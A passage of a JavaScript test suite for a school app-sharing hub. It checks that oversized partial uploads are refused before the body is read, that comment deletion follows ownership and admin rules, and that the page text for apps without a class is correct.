  const v = (await M.send('POST', `/apps/${app.id}/versionen`)).json();
  const csrfOf = async (b) => /<meta name="csrf" content="([^"]*)"/.exec((await b.page('/start')).text)[1];
  /** A PUT that announces `declared` bytes but sends only a little and never ends: only a check BEFORE reading can answer. */
  const partialPut = (b, csrf, url, declared) => new Promise((resolve, reject) => {
    const req = http.request({
      host: '127.0.0.1', port: h.config.publicPort, method: 'PUT', path: url,
      headers: {
        host: h.config.hubHost, cookie: [...b.jar].map(([k, val]) => `${k}=${val}`).join('; '),
        'content-type': 'application/octet-stream', 'content-length': declared, 'x-csrf-token': csrf, accept: 'application/json',
      },
    });
    const timer = setTimeout(() => {
      req.destroy();
      reject(new Error('no answer: the server waited for the body'));
    }, 3000);
    req.on('response', (res) => {
      clearTimeout(timer);
      res.resume();
      resolve({ status: res.statusCode, connection: res.headers.connection });
      req.destroy();
    });
    req.on('error', () => {}); // the server closes the connection while we would still be sending
    req.write(Buffer.alloc(64 * 1024, 0x41));
  });
  const big = 20 * 1024 * 1024; // under the 25 MB file limit: only the permission check can refuse it early
  const url = `/apps/${app.id}/versionen/${v.id}/datei?pfad=gross.js`;
  for (const who of [B, L, Y]) {
    const r = await partialPut(who, await csrfOf(who), url, big);
    assert.equal(r.status, 404);
    assert.equal(r.connection, 'close');
  }
  // the owner, but a finished version: refused before reading as well
  const csrfM = await csrfOf(M);
  assert.equal((await partialPut(M, csrfM, `/apps/${app.id}/versionen/${app.published_version_id}/datei?pfad=a.js`, big)).status, 404);
  // nothing was stored; the owner's real upload still works
  assert.equal(h.db.get('SELECT COUNT(*) AS n FROM app_files WHERE version_id = ?', v.id).n, 0);
  assert.equal((await M.send('PUT', `/apps/${app.id}/versionen/${v.id}/datei?pfad=index.html`, Buffer.from('<p>ok</p>'), 'application/octet-stream')).status, 200);
  await M.send('POST', `/apps/${app.id}/versionen/${v.id}/abbrechen`);
});

test('Kommentare löschen: nur die eigene – oder die Verwaltung; Entscheidungen bleiben', async () => {
  const app = await submitted(M, 'Kommentar-Test', cls7b);
  await M.post(`/apps/${app.id}/kommentare`, { text: 'Von Mia' });
  await L.post(`/apps/${app.id}/kommentare`, { text: 'Von Herrn Lehmann' });
  await L.post(`/pruefen/${cls7b}/${app.id}/zurueckgeben`, { version: app.published_version_id, grund: 'Bitte noch Farben.' });
  const id = (body) => h.db.get('SELECT id FROM comments WHERE app_id = ? AND body = ?', app.id, body).id;
  const exists = (cid) => Boolean(h.db.get('SELECT 1 AS ok FROM comments WHERE id = ?', cid));
  const del = (b, cid) => b.post(`/apps/${app.id}/kommentare/${cid}/loeschen`);
  const fromMia = id('Von Mia');
  const fromTeacher = id('Von Herrn Lehmann');
  const decision = id('Bitte noch Farben.');
  // the owner may open the app page, but not delete what the teacher wrote - and the other way round
  assert.equal((await del(M, fromTeacher)).status, 404);
  assert.equal((await del(L, fromMia)).status, 404);
  for (const who of [B, Y]) assert.equal((await del(who, fromMia)).status, 404);
  assert.ok(exists(fromTeacher) && exists(fromMia));
  // a decision is the review record: not even its author deletes it
  assert.equal((await del(L, decision)).status, 404);
  assert.ok(exists(decision));
  assert.equal((await del(M, fromMia)).status, 303);
  assert.equal(exists(fromMia), false);
  assert.equal((await del(A, fromTeacher)).status, 303, 'the admin may');
  assert.equal(exists(fromTeacher), false);
  const { access } = h.hub.ctx;
  assert.equal(access.canDeleteComment(mia, { kind: 'comment', author_id: lehmann.id }), false);
  assert.equal(access.canDeleteComment(admin, { kind: 'returned', author_id: lehmann.id }), false);
  assert.equal(access.isAppOwner(admin, app), false, 'the admin manages, but does not act as the owner');
  // ... so the admin cannot submit or withdraw in the owner's name
  assert.equal((await A.post(`/apps/${app.id}/zurueckziehen`, { klasse: cls7b })).status, 404);
});

test('Veröffentlichen ohne Klasse sagt, wer die App öffnen kann', async () => {
  const app = await h.makeApp(M, 'Nur für mich');
  const v2 = await h.uploadFolder(M, app.id, { 'index.html': '<p>v2</p>' });
  const page = (await M.get(`/apps/${app.id}`)).text;
  assert.ok(page.includes('Öffnen kann sie dann nur du – bis die App in einer Klasse ist oder für die ganze Schule freigegeben wird.'));
  assert.ok(!page.includes('wenn jemand die App startet'));
  assert.ok(page.includes(v2));
});
